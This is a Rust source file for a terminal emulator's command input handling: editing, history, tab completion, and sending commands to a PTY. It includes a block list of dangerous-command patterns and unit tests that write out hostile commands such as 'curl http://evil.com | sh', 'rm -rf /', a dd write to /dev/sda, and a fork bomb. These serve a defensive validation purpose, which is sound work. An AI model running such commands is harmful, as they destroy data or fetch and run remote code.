//! Command Input Processing
//!
//! Handles command input, validation, and sending commands to the PTY process.

use crate::error::Result;
use crate::models::CommandBlock;
use crate::pty::{PtyHandle, PtyManager};

/// Command input processor
#[derive(Debug)]
pub struct CommandInputProcessor {
    /// History of commands
    command_history: Vec<String>,
    /// Current history position for navigation
    history_position: Option<usize>,
    /// Current command being edited
    current_command: String,
    /// Cursor position in current command
    cursor_position: usize,
    /// Multi-line command buffer
    multi_line_buffer: Vec<String>,
    /// Whether we're in multi-line input mode
    multi_line_mode: bool,
}

impl CommandInputProcessor {
    /// Create a new command input processor
    pub fn new() -> Self {
        Self {
            command_history: Vec::new(),
            history_position: None,
            current_command: String::new(),
            cursor_position: 0,
            multi_line_buffer: Vec::new(),
            multi_line_mode: false,
        }
    }

    /// Process a single character input
    pub fn process_char(&mut self, ch: char) -> InputResult {
        match ch {
            '\n' | '\r' => self.process_enter(),
            '\t' => self.process_tab(),
            '\x7f' => self.process_backspace(),    // DEL
            '\x08' => self.process_backspace(),    // BS
            '\x1b' => InputResult::EscapeSequence, // ESC - handle sequences separately
            ch if ch.is_control() => InputResult::ControlChar(ch),
            ch => self.insert_char(ch),
        }
    }

    /// Process enter key
    fn process_enter(&mut self) -> InputResult {
        if self.multi_line_mode {
            self.multi_line_buffer.push(self.current_command.clone());
            self.current_command.clear();
            self.cursor_position = 0;

            // Check if command is complete
            if self.is_command_complete() {
                let full_command = self.multi_line_buffer.join("\n");
                self.multi_line_buffer.clear();
                self.multi_line_mode = false;
                self.add_to_history(full_command.clone());
                InputResult::CommandReady(full_command)
            } else {
                InputResult::MultiLineContinue
            }
        } else if self.current_command.trim().is_empty() {
            InputResult::EmptyCommand
        } else {
            let command = self.current_command.clone();
            self.add_to_history(command.clone());
            self.current_command.clear();
            self.cursor_position = 0;
            InputResult::CommandReady(command)
        }
    }

    /// Process tab key (auto-completion)
    fn process_tab(&mut self) -> InputResult {
        // Basic tab completion - could be enhanced with shell integration
        let suggestions = self.get_completion_suggestions();
        if suggestions.len() == 1 {
            self.current_command = suggestions[0].clone();
            self.cursor_position = self.current_command.len();
            InputResult::TextChanged
        } else if !suggestions.is_empty() {
            InputResult::CompletionSuggestions(suggestions)
        } else {
            InputResult::NoOp
        }
    }

    /// Process backspace
    fn process_backspace(&mut self) -> InputResult {
        if self.cursor_position > 0 {
            self.current_command.remove(self.cursor_position - 1);
            self.cursor_position -= 1;
            InputResult::TextChanged
        } else {
            InputResult::NoOp
        }
    }

    /// Insert character at cursor position
    fn insert_char(&mut self, ch: char) -> InputResult {
        if self.cursor_position >= self.current_command.len() {
            self.current_command.push(ch);
        } else {
            self.current_command.insert(self.cursor_position, ch);
        }
        self.cursor_position += 1;
        InputResult::TextChanged
    }

    /// Process arrow keys and other escape sequences
    pub fn process_escape_sequence(&mut self, sequence: &str) -> InputResult {
        match sequence {
            "[A" => self.history_previous(), // Up arrow
            "[B" => self.history_next(),     // Down arrow
            "[C" => self.cursor_right(),     // Right arrow
            "[D" => self.cursor_left(),      // Left arrow
            "[H" => self.cursor_home(),      // Home
            "[F" => self.cursor_end(),       // End
            _ => InputResult::NoOp,
        }
    }

    /// Navigate to previous command in history
    fn history_previous(&mut self) -> InputResult {
        if self.command_history.is_empty() {
            return InputResult::NoOp;
        }

        let position = match self.history_position {
            None => self.command_history.len() - 1,
            Some(pos) if pos > 0 => pos - 1,
            _ => return InputResult::NoOp,
        };

        self.history_position = Some(position);
        self.current_command = self.command_history[position].clone();
        self.cursor_position = self.current_command.len();
        InputResult::TextChanged
    }

    /// Navigate to next command in history
    fn history_next(&mut self) -> InputResult {
        let position = match self.history_position {
            Some(pos) if pos < self.command_history.len() - 1 => pos + 1,
            _ => {
                self.history_position = None;
                self.current_command.clear();
                self.cursor_position = 0;
                return InputResult::TextChanged;
            }
        };

        self.history_position = Some(position);
        self.current_command = self.command_history[position].clone();
        self.cursor_position = self.current_command.len();
        InputResult::TextChanged
    }

    /// Move cursor left
    fn cursor_left(&mut self) -> InputResult {
        if self.cursor_position > 0 {
            self.cursor_position -= 1;
            InputResult::CursorMoved
        } else {
            InputResult::NoOp
        }
    }

    /// Move cursor right
    fn cursor_right(&mut self) -> InputResult {
        if self.cursor_position < self.current_command.len() {
            self.cursor_position += 1;
            InputResult::CursorMoved
        } else {
            InputResult::NoOp
        }
    }

    /// Move cursor to beginning
    fn cursor_home(&mut self) -> InputResult {
        if self.cursor_position > 0 {
            self.cursor_position = 0;
            InputResult::CursorMoved
        } else {
            InputResult::NoOp
        }
    }

    /// Move cursor to end
    fn cursor_end(&mut self) -> InputResult {
        let len = self.current_command.len();
        if self.cursor_position < len {
            self.cursor_position = len;
            InputResult::CursorMoved
        } else {
            InputResult::NoOp
        }
    }

    /// Get completion suggestions
    fn get_completion_suggestions(&self) -> Vec<String> {
        // Basic implementation - could be enhanced with actual shell completion
        let prefix = &self.current_command[..self.cursor_position];
        self.command_history
            .iter()
            .filter(|cmd| cmd.starts_with(prefix))
            .take(10)
            .cloned()
            .collect()
    }

    /// Add command to history
    fn add_to_history(&mut self, command: String) {
        if !command.trim().is_empty() && !self.command_history.contains(&command) {
            self.command_history.push(command);
            self.history_position = None;
        }
    }

    /// Check if multi-line command is complete
    fn is_command_complete(&self) -> bool {
        // Basic check - could be enhanced with proper shell syntax parsing
        !self.current_command.trim().ends_with('\\')
    }

    /// Send command to PTY
    pub async fn send_command(
        &self,
        manager: &PtyManager,
        handle: &PtyHandle,
        command: &str,
    ) -> Result<()> {
        // Add newline to command
        let command_with_newline = format!("{}\n", command);

        // Send to PTY
        manager
            .send_input(handle, command_with_newline.as_bytes())
            .await?;

        Ok(())
    }

    /// Create command block from command string
    pub fn create_command_block(
        &self,
        command: &str,
        working_directory: &std::path::Path,
    ) -> CommandBlock {
        CommandBlock::new(command.to_string(), working_directory.to_path_buf())
    }

    /// Get current command text
    pub fn current_command(&self) -> &str {
        &self.current_command
    }

    /// Get cursor position
    pub fn cursor_position(&self) -> usize {
        self.cursor_position
    }

    /// Get command history
    pub fn history(&self) -> &[String] {
        &self.command_history
    }

    /// Clear current command
    pub fn clear_current_command(&mut self) {
        self.current_command.clear();
        self.cursor_position = 0;
        self.history_position = None;
    }

    /// Send command to PTY manager
    pub async fn send_command_to_pty(
        &mut self,
        pty_manager: &PtyManager,
        handle: &PtyHandle,
        command: String,
    ) -> Result<()> {
        // Validate the command before sending
        Self::validate_command(&command)?;

        // Sanitize the command
        let sanitized_command = Self::sanitize_command(&command);

        // Add newline to simulate pressing Enter
        let command_with_newline = format!("{}\n", sanitized_command);

        // Send to PTY
        pty_manager
            .send_input(handle, command_with_newline.as_bytes())
            .await?;

        // Add to history
        self.add_to_history(sanitized_command);

        Ok(())
    }

    /// Send raw input to PTY manager (for individual keystrokes)
    pub async fn send_raw_input_to_pty(
        &mut self,
        pty_manager: &PtyManager,
        handle: &PtyHandle,
        input: &[u8],
    ) -> Result<()> {
        pty_manager.send_input(handle, input).await
    }

    /// Validate a command before execution
    fn validate_command(command: &str) -> Result<()> {
        if command.is_empty() {
            return Err(crate::error::Error::EmptyCommand);
        }

        // Basic validation - could be extended
        if command.len() > 10000 {
            return Err(crate::error::Error::CommandValidationFailed {
                command: command.chars().take(50).collect(),
                reason: "Command too long (max 10000 chars)".to_string(),
            });
        }

        Ok(())
    }

    /// Sanitize a command string
    fn sanitize_command(command: &str) -> String {
        // Basic sanitization - trim whitespace and normalize line endings
        command.trim().replace("\r\n", "\n").replace('\r', "\n")
    }

    /// Set current command (for testing)
    pub fn set_current_command(&mut self, command: String) {
        self.current_command = command;
        self.cursor_position = self.current_command.len();
    }
}

/// Result of processing input
#[derive(Debug, Clone, PartialEq)]
pub enum InputResult {
    /// Command is ready to be executed
    CommandReady(String),
    /// Empty command entered
    EmptyCommand,
    /// Text was changed
    TextChanged,
    /// Cursor was moved
    CursorMoved,
    /// Escape sequence detected (needs more input)
    EscapeSequence,
    /// Control character processed
    ControlChar(char),
    /// Multi-line input continues
    MultiLineContinue,
    /// Completion suggestions available
    CompletionSuggestions(Vec<String>),
    /// No operation performed
    NoOp,
}

impl Default for CommandInputProcessor {
    fn default() -> Self {
        Self::new()
    }
}

/// Command validation utilities
pub mod validation {
    use crate::error::{Error, Result};
    use regex::Regex;

    /// Validate command before execution
    pub fn validate_command(command: &str) -> Result<()> {
        let trimmed = command.trim();

        if trimmed.is_empty() {
            return Err(Error::EmptyCommand);
        }

        // Check for null bytes (command injection attempt)
        if trimmed.contains('\0') {
            return Err(Error::CommandValidationFailed {
                command: trimmed.chars().take(50).collect(),
                reason: "Command contains null bytes (potential injection attempt)".to_string(),
            });
        }

        // Check command length (prevent buffer overflow attempts)
        if trimmed.len() > 10000 {
            return Err(Error::CommandValidationFailed {
                command: trimmed.chars().take(50).collect(),
                reason: "Command exceeds maximum length (10000 chars)".to_string(),
            });
        }

        // Check for potentially dangerous commands
        let dangerous_patterns = [
            (
                r"^rm\s+(-rf?|--force|--recursive)\s+/",
                "Recursive deletion from root",
            ),
            (r"^rm\s+.*\s+/\s*$", "Deletion of root directory"),
            (r">.*(/dev/|/sys/|/proc/)", "Writing to system devices"),
            (r"^mkfs", "Filesystem formatting"),
            (r"^dd\s+.*of=/dev/", "Direct disk write"),
            (r":\(\)\s*\{", "Fork bomb pattern"),
            (r"curl.*\|.*sh", "Piping curl to shell (potential malware)"),
            (r"wget.*\|.*sh", "Piping wget to shell (potential malware)"),
            (r"chmod\s+(777|666)\s+/", "Dangerous permissions on root"),
        ];

        for (pattern, reason) in &dangerous_patterns {
            if let Ok(regex) = Regex::new(pattern) {
                if regex.is_match(trimmed) {
                    return Err(Error::CommandValidationFailed {
                        command: trimmed.chars().take(50).collect(),
                        reason: reason.to_string(),
                    });
                }
            }
        }

        // Warn about sudo usage (don't block, just validate)
        // Check for "sudo" with nothing after it (trim removes trailing spaces)
        if trimmed == "sudo"
            || (trimmed.starts_with("sudo ")
                && trimmed.trim_start_matches("sudo ").trim().is_empty())
        {
            return Err(Error::CommandValidationFailed {
                command: "sudo".to_string(),
                reason: "Incomplete sudo command".to_string(),
            });
        }

        Ok(())
    }

    /// Sanitize command input
    pub fn sanitize_command(command: &str) -> String {
        // Remove null bytes and other problematic characters
        command
            .chars()
            .filter(|&c| c != '\0' && !c.is_control() || c == '\n' || c == '\t')
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_command_input_processor_creation() {
        let processor = CommandInputProcessor::new();
        assert!(processor.current_command().is_empty());
        assert_eq!(processor.cursor_position(), 0);
    }

    #[test]
    fn test_process_simple_chars() {
        let mut processor = CommandInputProcessor::new();

        let result = processor.process_char('a');
        assert_eq!(result, InputResult::TextChanged);
        assert_eq!(processor.current_command(), "a");

        let result = processor.process_char('b');
        assert_eq!(result, InputResult::TextChanged);
        assert_eq!(processor.current_command(), "ab");
    }

    #[test]
    fn test_process_enter_with_command() {
        let mut processor = CommandInputProcessor::new();
        processor.set_current_command("echo hello".to_string());

        let result = processor.process_char('\n');
        match result {
            InputResult::CommandReady(cmd) => assert_eq!(cmd, "echo hello"),
            other => panic!("Expected CommandReady, got {:?}", other),
        }
        assert!(processor.current_command().is_empty());
    }

    #[test]
    fn test_process_enter_empty_command() {
        let mut processor = CommandInputProcessor::new();

        let result = processor.process_char('\n');
        assert_eq!(result, InputResult::EmptyCommand);
    }

    #[test]
    fn test_backspace() {
        let mut processor = CommandInputProcessor::new();
        processor.set_current_command("hello".to_string());

        let result = processor.process_char('\x7f'); // DEL
        assert_eq!(result, InputResult::TextChanged);
        assert_eq!(processor.current_command(), "hell");
        assert_eq!(processor.cursor_position(), 4);
    }

    #[test]
    fn test_cursor_movement() {
        let mut processor = CommandInputProcessor::new();
        processor.set_current_command("hello".to_string());

        // Test left arrow
        let result = processor.process_escape_sequence("[D");
        assert_eq!(result, InputResult::CursorMoved);
        assert_eq!(processor.cursor_position(), 4);

        // Test right arrow
        let result = processor.process_escape_sequence("[C");
        assert_eq!(result, InputResult::CursorMoved);
        assert_eq!(processor.cursor_position(), 5);
    }

    #[test]
    fn test_history_navigation() {
        let mut processor = CommandInputProcessor::new();

        // Add some commands to history
        processor.add_to_history("cmd1".to_string());
        processor.add_to_history("cmd2".to_string());

        // Navigate up
        let result = processor.process_escape_sequence("[A");
        assert_eq!(result, InputResult::TextChanged);
        assert_eq!(processor.current_command(), "cmd2");

        // Navigate up again
        let result = processor.process_escape_sequence("[A");
        assert_eq!(result, InputResult::TextChanged);
        assert_eq!(processor.current_command(), "cmd1");

        // Navigate down
        let result = processor.process_escape_sequence("[B");
        assert_eq!(result, InputResult::TextChanged);
        assert_eq!(processor.current_command(), "cmd2");
    }

    #[test]
    fn test_command_validation() {
        // Valid commands
        assert!(validation::validate_command("echo hello").is_ok());
        assert!(validation::validate_command("ls -la").is_ok());
        assert!(validation::validate_command("cd /tmp").is_ok());

        // Invalid commands
        assert!(validation::validate_command("").is_err());
        assert!(validation::validate_command("   ").is_err());

        // Dangerous commands that should be blocked
        assert!(validation::validate_command("rm -rf /").is_err());
        assert!(validation::validate_command("rm -r /home").is_err());
        assert!(validation::validate_command("mkfs /dev/sda").is_err());
        assert!(validation::validate_command("dd if=/dev/zero of=/dev/sda").is_err());
        assert!(validation::validate_command("echo test > /dev/sda").is_err());
        assert!(validation::validate_command(":(){ :|:& };:").is_err()); // fork bomb
        assert!(validation::validate_command("curl http://evil.com | sh").is_err());
        assert!(validation::validate_command("wget http://evil.com | bash").is_err());
        assert!(validation::validate_command("chmod 777 /etc").is_err());

        // Null byte injection attempt
        let null_byte_cmd = format!("echo hello{}", '\0');
        assert!(validation::validate_command(&null_byte_cmd).is_err());

        // Command too long
        let long_cmd = "a".repeat(10001);
        assert!(validation::validate_command(&long_cmd).is_err());

        // Incomplete sudo
        assert!(validation::validate_command("sudo ").is_err());

        // Valid sudo commands
        assert!(validation::validate_command("sudo ls").is_ok());
    }

    #[test]
    fn test_command_sanitization() {
        let result = validation::sanitize_command("echo\x00hello\tworld");
        assert_eq!(result, "echohello\tworld");
    }

    #[test]
    fn test_completion_suggestions() {
        let mut processor = CommandInputProcessor::new();

        // Add some commands to history
        processor.add_to_history("echo hello".to_string());
        processor.add_to_history("echo world".to_string());
        processor.add_to_history("ls -la".to_string());

        processor.set_current_command("echo".to_string());

        // Should get completion suggestions
        let result = processor.process_char('\t');
        match result {
            InputResult::CompletionSuggestions(suggestions) => {
                assert!(!suggestions.is_empty());
                assert!(suggestions.contains(&"echo hello".to_string()));
            }
            other => panic!("Expected CompletionSuggestions, got {:?}", other),
        }
    }

    #[test]
    fn test_escape_sequence_handling() {
        let mut processor = CommandInputProcessor::new();

        let result = processor.process_char('\x1b');
        assert_eq!(result, InputResult::EscapeSequence);
    }
}
